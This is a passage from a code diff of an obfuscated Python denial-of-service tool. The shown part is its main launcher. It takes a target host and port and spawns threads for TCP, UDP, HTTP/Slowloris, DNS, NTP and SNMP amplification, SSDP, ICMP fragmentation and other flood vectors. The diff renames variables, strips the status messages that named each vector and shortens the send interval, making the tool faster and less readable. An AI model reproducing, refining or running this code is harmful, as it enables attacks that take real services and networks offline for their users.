-eu = Queue()
 
 if __name__ == '__main__':
     if len(sys.argv) < 2:
-        ex()
-    ey()
+        dr()
+    ds()
     a()
     c()
-    print(l, "port:", ay, "threads:", ez, "mode:", fb)
+    print(l, "port:", ac, "threads:", ez, "mode:", fb)
     time.sleep(1)
-    signal.signal(signal.SIGINT, lambda fc, fd: sys.exit(0))
+    signal.signal(signal.SIGINT, lambda du, dv: sys.exit(0))
     try:
-        fc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        fc.settimeout(1)
-        fc.connect((l, int(ay)))
-        fc.close()
+        dw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        dw.settimeout(1)
+        dw.connect((l, int(ac)))
+        dw.close()
     except:
         pass
     if fb in ["tcp", "both", "full"]:
         for _ in range(int(ez)):
-            ff = threading.Thread(target=dk)
-            ff.daemon = True
-            ff.start()
-        print("[+] TCP threads running")
+            dx = threading.Thread(target=cf)
+            dx.daemon = True
+            dx.start()
     if fb in ["udp", "both", "full"]:
         for _ in range(int(ez/2)):
-            ff = threading.Thread(target=dm)
-            ff.daemon = True
-            ff.start()
-        print("[+] UDP threads running")
+            dx = threading.Thread(target=ci)
+            dx.daemon = True
+            dx.start()
     if fb in ["http", "full"]:
         for _ in range(int(ez/3)):
-            ff = threading.Thread(target=do)
-            ff.daemon = True
-            ff.start()
+            dx = threading.Thread(target=ck)
+            dx.daemon = True
+            dx.start()
         for _ in range(int(ez/6)):
-            ff = threading.Thread(target=dr)
-            ff.daemon = True
-            ff.start()
-        print("[+] HTTP bot + Slowloris threads running")
+            dx = threading.Thread(target=cm)
+            dx.daemon = True
+            dx.start()
     if fb in ["dns", "full"]:
         for _ in range(int(ez/4)):
-            ff = threading.Thread(target=dt)
-            ff.daemon = True
-            ff.start()
-        print("[+] DNS amplification threads running")
+            dx = threading.Thread(target=co)
+            dx.daemon = True
+            dx.start()
     if fb in ["ntp", "full"]:
         for _ in range(int(ez/4)):
-            ff = threading.Thread(target=dv)
-            ff.daemon = True
-            ff.start()
-        print("[+] NTP amplification threads running")
+            dx = threading.Thread(target=cq)
+            dx.daemon = True
+            dx.start()
     if fb in ["ssdp", "full"]:
         for _ in range(int(ez/4)):
-            ff = threading.Thread(target=dx)
-            ff.daemon = True
-            ff.start()
-        print("[+] SSDP multicast threads running")
+            dx = threading.Thread(target=cs)
+            dx.daemon = True
+            dx.start()
     if fb in ["snmp", "full"]:
         for _ in range(int(ez/4)):
-            ff = threading.Thread(target=dz)
-            ff.daemon = True
-            ff.start()
-        print("[+] SNMP reflection threads running")
+            dx = threading.Thread(target=cu)
+            dx.daemon = True
+            dx.start()
     if fb in ["icmp", "full"]:
         for _ in range(int(ez/3)):
-            ff = threading.Thread(target=eb)
-            ff.daemon = True
-            ff.start()
-        print("[+] ICMP fragmentation threads running")
+            dx = threading.Thread(target=cw)
+            dx.daemon = True
+            dx.start()
     if fb in ["full"]:
         for _ in range(int(ez/8)):
-            ff = threading.Thread(target=ed)
-            ff.daemon = True
-            ff.start()
-            ff = threading.Thread(target=ef)
-            ff.daemon = True
-            ff.start()
-            ff = threading.Thread(target=eh)
-            ff.daemon = True
-            ff.start()
-            ff = threading.Thread(target=ej)
-            ff.daemon = True
-            ff.start()
-            ff = threading.Thread(target=el)
-            ff.daemon = True
-            ff.start()
-            ff = threading.Thread(target=en)
-            ff.daemon = True
-            ff.start()
-            ff = threading.Thread(target=ep)
-            ff.daemon = True
-            ff.start()
-            ff = threading.Thread(target=er)
-            ff.daemon = True
-            ff.start()
-            ff = threading.Thread(target=et)
-            ff.daemon = True
-            ff.start()
-        print("[+] Extra vectors: pipeline flood, fd leak, OOM, deauth, ARP, reset, SSL, kernel hammer")
-    fg = threading.Thread(target=ev)
-    fg.daemon = True
-    fg.start()
+            dx = threading.Thread(target=cy)
+            dx.daemon = True
+            dx.start()
+            dx = threading.Thread(target=da)
+            dx.daemon = True
+            dx.start()
+            dx = threading.Thread(target=dc)
+            dx.daemon = True
+            dx.start()
+            dx = threading.Thread(target=de)
+            dx.daemon = True
+            dx.start()
+            dx = threading.Thread(target=dg)
+            dx.daemon = True
+            dx.start()
+            dx = threading.Thread(target=di)
+            dx.daemon = True
+            dx.start()
+            dx = threading.Thread(target=dk)
+            dx.daemon = True
+            dx.start()
+            dx = threading.Thread(target=dm)
+            dx.daemon = True
+            dx.start()
+            dx = threading.Thread(target=do)
+            dx.daemon = True
+            dx.start()
+    dy = threading.Thread(target=dq)
+    dy.daemon = True
+    dy.start()
     while True:
         for _ in range(int(ez)):
             if fb in ["tcp", "both", "full"]:
-                dq.put(_)
+                ch.put(_)
             if fb in ["udp", "both", "full"]:
-                dn.put(_)
+                cj.put(_)
             if fb in ["http", "full"]:
-                dp.put(_)
-                ds.put(_)
+                cl.put(_)
+                cn.put(_)
             if fb in ["dns", "full"]:
-                du.put(_)
+                cp.put(_)
             if fb in ["ntp", "full"]:
-                dw.put(_)
+                cr.put(_)
             if fb in ["ssdp", "full"]:
-                dy.put(_)
+                ct.put(_)
             if fb in ["snmp", "full"]:
-                ea.put(_)
+                cv.put(_)
             if fb in ["icmp", "full"]:
-                ec.put(_)
+                cx.put(_)
             if fb in ["full"]:
-                ee.put(_)
-                eg.put(_)
-                ei.put(_)
-                ek.put(_)
-                em.put(_)
-                eo.put(_)
-                eq.put(_)
-                es.put(_)
-                eu.put(_)
-        time.sleep(0.0001)
+                cz.put(_)
+                db.put(_)
+                dd.put(_)
+                df.put(_)
+                dh.put(_)
+                dj.put(_)
+                dl.put(_)
+                dn.put(_)
+                dp.put(_)
+        time.sleep(0.00005)
